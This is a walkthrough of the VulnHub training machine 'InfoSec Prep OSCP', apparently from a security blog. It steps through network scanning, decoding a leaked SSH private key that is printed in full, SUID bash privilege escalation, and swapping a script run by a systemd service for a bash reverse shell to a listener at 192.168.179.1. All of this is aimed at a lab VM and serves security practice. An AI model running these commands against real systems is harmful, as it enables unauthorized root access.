---
title: VulnHub - InfoSec Prep OSCP
author: ret2x
date: 2021-10-21 18:00:00 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, file disclosure]
image:
    path: /assets/images/infosecpreposcp/front.png
---

**Description:** A linux machine whose access to the server was via a weak SSH private key disclosure. Misconfigurations allowed to get root privileges.

**Author:** FalconSpy

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/infosec-prep-oscp,508/](https://www.vulnhub.com/entry/infosec-prep-oscp,508/)

# Information Gathering
## Host Discovery

I discovered the target machine on the local network with netdiscover.

```console
root@kali:~$ netdiscover -i vmnet1 -r 192.168.179.1/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 7 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 402
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.179.157 00:0c:29:b9:57:e3      6     360  VMware, Inc.
 192.168.179.254 00:50:56:ee:43:01      1      42  VMware, Inc.
```

### Port Scanning

Then, I proceeded to perform a full TCP/UDP scan to find available ports.

```console
root@kali:~$ us -mT -Iv -p1-65535 192.168.179.157 -r 3000 -R 3 && us -mU -Iv -p1-65535 192.168.179.157 -r 3000 -R 3
adding 192.168.179.157/32 mode `TCPscan' ports `1-65535' pps 3000
using interface(s) vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
TCP open 192.168.179.157:80  ttl 64
TCP open 192.168.179.157:22  ttl 64
TCP open 192.168.179.157:33060  ttl 64
sender statistics 2395.4 pps with 196605 packets sent total
listener statistics 390334 packets recieved 0 packets droped and 0 interface drops
TCP open                     ssh[   22]         from 192.168.179.157  ttl 64
TCP open                    http[   80]         from 192.168.179.157  ttl 64
TCP open                 unknown[33060]         from 192.168.179.157  ttl 64
adding 192.168.179.157/32 mode `UDPscan' ports `1-65535' pps 3000
using interface(s) vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
```

### Service Enumeration

I did service and OS detection, script scanning and traceroute on the target machine.

```console
root@kali:~$ nmap -n -v -A -p22,80,33060 192.168.179.157 -oN nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.4.2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/secret.txt
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: OSCP Voucher &#8211; Just another WordPress site
33060/tcp open  mysqlx?
```

### Web Enumeration

On port 80 a wordpress CMS is running, as we saw in the enumeration of services with nmap, the robots files is available, in this I found the secret.txt file.

![](/assets/images/infosecpreposcp/screenshot-1.png)

![](/assets/images/infosecpreposcp/screenshot-2.png)

This file contains a base64 string.

![](/assets/images/infosecpreposcp/screenshot-3.png)

I downloaded it and decoded it, this is an OPENSSH private key.

```console
root@kali:~$ curl -s http://192.168.179.157/secret.txt | base64 -d
-----BEGIN OPENSSH PRIVATE KEY-----
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
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----
```

So I saved this private key to a file.

```console
root@kali:~$ curl -s http://192.168.179.157/secret.txt | base64 -d  > id_rsa
```

On the main page, in the following text I found the user **oscp**.

![](/assets/images/infosecpreposcp/screenshot-4.png)

## Exploitation
### Access via SSH

Before to log in is necessary grant write and read privileges to private key file, then I logged in via ssh as the user oscp. 

```console
root@kali:~$ chmod 400 id_rsa

root@kali:~$ ssh oscp@192.168.179.157 -i id_rsa
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jul 11 16:50:11 2020 from 192.168.128.1
-bash-5.0$ id
uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

In the above output we see that the **oscp** user belogs to lxd group, we can exploit that to get root, but by listing the SUID binaries, I was able to detect the bash binary, this allows us to elevate our privileges in an easy way.

```console
-bash-5.0$ find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/bash
...
```

## Privilege Escalation
### SUID Binary

To get root, we just need to run the bash command with the -p option.

```console
-bash-5.0$ /usr/bin/bash -p
bash-5.0# id
uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
bash-5.0# cat flag.txt 
d73b04b0e696b0945283defa3eee4538
```

### System Service

Another way to get root, as we see In the oscp's home directory there's an ip script that performs a couple of tasks.

```console
-bash-5.0$ ls
ip  snap
-bash-5.0$ cat ip
#!/bin/sh
cp /etc/issue-standard /etc/issue
/usr/local/bin/get-ip-address >> /etc/issue
```

We search the path of this script in a file, it's in the ip-update.service file, if we run this service the script will be executed.

```console
-bash-5.0$ grep -r '/home/oscp/ip' /etc 2>/dev/null 
/etc/systemd/system/ip-update.service:ExecStart=/home/oscp/ip
-bash-5.0$ cat /etc/systemd/system/ip-update.service
[Unit]
Description=Write current ip addr to /etc/issue

[Service]
Type=oneshot
RemainAfterExit=true
ExecStart=/home/oscp/ip

[Install]
WantedBy=multi-user.target
```

With this in mind, I did a copy of the ip file, then I saved a bash reverse shell in that file, and gave it execute permissions.

```console
-bash-5.0$ mv ip ip.old
-bash-5.0$ echo '#!/bin/bash' > ip
-bash-5.0$ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.179.1/443 0>&1"' >> ip
-bash-5.0$ chmod +x ip
```

Then, I started a netcat listener, rebooted the machine and got root.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.157] 49772
bash: cannot set terminal process group (758): Inappropriate ioctl for device
bash: no job control in this shell
root@oscp:/#
```
